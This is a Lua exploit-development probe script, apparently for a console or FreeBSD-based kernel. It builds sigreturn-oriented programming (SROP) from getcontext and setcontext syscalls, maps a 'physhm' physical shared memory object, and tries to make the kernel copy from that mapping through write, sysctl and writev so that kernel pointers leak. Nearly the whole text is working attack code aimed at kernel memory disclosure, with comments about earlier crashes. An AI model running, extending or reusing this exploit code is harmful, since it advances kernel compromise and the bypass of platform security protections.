-- CRASH_CLASS: MODERATE
-- PROBE 174a: physhm copyin via SROP write + alternative syscalls
--
-- 173a: fcall_with_rax write(pipe, physhm_va) killed the process.
-- Try SROP for more precise control, and test alternative copyin
-- syscalls: sysctl(mib=physhm), sendmsg, writev.
-- Also test if the crash is from write() itself or from the mmap page.

print("=== PROBE 174a: PHYSHM SROP COPYIN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP setup
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("srop_addr=" .. hex64(sc_addr))

local function wq(a,v) memory.write_qword(a,v) end
local function wd(a,v) memory.write_dword(a,v) end
local function rd(a) return to_num(memory.read_dword(a)) end
local function rq(a) return memory.read_qword(a) end

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

-- GPU buffer for data
local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end
print("gpu=" .. hex64(gpu))

-- [A] Open physhm
print("")
print("--- [A] PHYSHM_OPEN ---")
local rv = srop(629, uint64(1), uint64(2), uint64(0), uint64(0))
local physhm_fd = rv and to_num(rv) or -1
print("physhm_open fd=" .. physhm_fd)

if physhm_fd < 0 then
    for a3 = 1, 3 do
        rv = srop(629, uint64(1), uint64(2), uint64(0), uint64(a3))
        physhm_fd = rv and to_num(rv) or -1
        if physhm_fd >= 0 then
            print("physhm_open(1,2,0," .. a3 .. ") fd=" .. physhm_fd)
            break
        end
    end
end

if physhm_fd < 0 then
    print("FAILED to open physhm")
    print("=== DONE ===")
    return
end

-- [B] Create pipe via SROP
print("")
print("--- [B] PIPE ---")
-- pipe2(fildes, 0) = sys 542 on FreeBSD
-- Or use pipe() = sys 42
rv = srop(42, uint64(0), uint64(0), uint64(0))
local pipe_rd = rv and to_num(rv) or -1
print("pipe rd=" .. pipe_rd .. " wr=" .. (pipe_rd + 1))

-- [C] mmap physhm via SROP
print("")
print("--- [C] MMAP PHYSHM ---")
rv = srop(477, uint64(0), uint64(0x4000), uint64(3), uint64(1), uint64(physhm_fd), uint64(0))
local mm_h, mm_l = 0, 0
if rv then
    mm_h, mm_l = get_hi_lo(rv)
    print("physhm_mmap=" .. hex64(rv))
else
    print("physhm_mmap FAILED (pcall)")
end

if mm_h == 0 and mm_l == 0 then
    print("mmap returned NULL, trying 0x1000")
    rv = srop(477, uint64(0), uint64(0x1000), uint64(3), uint64(1), uint64(physhm_fd), uint64(0))
    if rv then
        mm_h, mm_l = get_hi_lo(rv)
        print("physhm_mmap(0x1000)=" .. hex64(rv))
    end
end

if mm_h == 0 and mm_l == 0 then
    print("All mmap failed")
    print("=== DONE ===")
    return
end

local physhm_va = uint64(string.format("0x%X%08X", mm_h, mm_l))
print("physhm_va=" .. hex64(physhm_va))

-- [D] Test: can we query the mapping via sys 547?
print("")
print("--- [D] QUERY MAPPING (547) ---")
local QM = 0x50000
for off = 0, 0x47, 4 do wd(gpu + QM + off, 0) end
rv = srop(547, physhm_va, ga(QM), uint64(0x48))
local qm_rv = rv and to_num(rv) or -999
print("query_mem=" .. qm_rv)
if qm_rv == 0 then
    local start_q = rq(gpu + QM)
    local end_q = rq(gpu + QM + 0x08)
    local prot = rd(gpu + QM + 0x18)
    print("  start=" .. hex64(start_q))
    print("  end=" .. hex64(end_q))
    print("  prot=0x" .. string.format("%X", prot))
    -- Read the name
    local nm = ""
    for i = 0, 31 do
        local off2 = 0x20 + i
        local b = math.floor(rd(gpu + QM + (off2 - off2%4)) / (256 ^ (off2%4))) % 256
        if b == 0 then break end
        nm = nm .. string.char(b)
    end
    if #nm > 0 then print("  name=" .. nm) end
end

-- [E] Test write via SROP (more precise register control)
print("")
print("--- [E] SROP WRITE TEST ---")
print("BEFORE write(pipe_wr, physhm_va, 8)")

-- Write 8 bytes from physhm_va to pipe via SROP
rv = srop(4, uint64(pipe_rd + 1), physhm_va, uint64(8))
local wr = rv and to_num(rv) or -999
print("write=" .. wr)

if wr > 0 then
    print(">>> COPYIN SUCCEEDED! <<<")
    -- Read from pipe into GPU
    local rd_rv = srop(3, uint64(pipe_rd), ga(0x60000), uint64(wr))
    local got = rd_rv and to_num(rd_rv) or -1
    print("read from pipe: " .. got .. " bytes")
    if got > 0 then
        local data_q = rq(gpu + 0x60000)
        print("data=" .. hex64(data_q))
        local dh, dl = get_hi_lo(data_q)
        if dh >= 0xFFFF8000 and dh < 0xFFFFFFFF then
            print("*** KERNEL POINTER FOUND! ***")
        end
    end
elseif wr == -1 then
    print("write returned -1 (EFAULT — copyin rejected)")
else
    print("write returned " .. wr)
end

-- [F] Alternative: sysctl with physhm_va as newp (write path)
print("")
print("--- [F] SYSCTL COPYIN TEST ---")
-- sysctl(mib, namelen, oldp, oldlenp, newp, newlen)
-- If we set newp = physhm_va, the kernel will copyin from physhm_va
-- Use a harmless MIB like kern.hostname (MIB {1, 10})
local MIB = 0x70000
wd(gpu + MIB, 1)      -- CTL_KERN
wd(gpu + MIB + 4, 10) -- KERN_HOSTNAME
local LENP = 0x70100
wq(gpu + LENP, uint64(0x100))
local OUTBUF = 0x70200

print("BEFORE sysctl with newp=physhm_va")
rv = srop(202, ga(MIB), uint64(2), ga(OUTBUF), ga(LENP), physhm_va, uint64(8))
local sctl = rv and to_num(rv) or -999
print("sysctl=" .. sctl)

-- [G] Alternative: writev with physhm iov
print("")
print("--- [G] WRITEV TEST ---")
-- Build an iovec pointing to physhm_va
local IOV = 0x80000
wq(gpu + IOV, physhm_va)      -- iov_base = physhm
wq(gpu + IOV + 8, uint64(8))  -- iov_len = 8

print("BEFORE writev(pipe_wr, iov, 1)")
rv = srop(121, uint64(pipe_rd + 1), ga(IOV), uint64(1))
local wv = rv and to_num(rv) or -999
print("writev=" .. wv)

if wv > 0 then
    print(">>> WRITEV COPYIN SUCCEEDED! <<<")
    local rd_rv2 = srop(3, uint64(pipe_rd), ga(0x60000), uint64(wv))
    local got2 = rd_rv2 and to_num(rd_rv2) or -1
    print("read: " .. got2 .. " bytes")
    if got2 > 0 then
        print("data=" .. hex64(rq(gpu + 0x60000)))
    end
end

-- [H] Cleanup
print("")
srop(6, uint64(pipe_rd))
srop(6, uint64(pipe_rd + 1))
srop(6, uint64(physhm_fd))
print("pid_post=" .. to_num(make_syscall(20)()))
print("=== DONE ===")
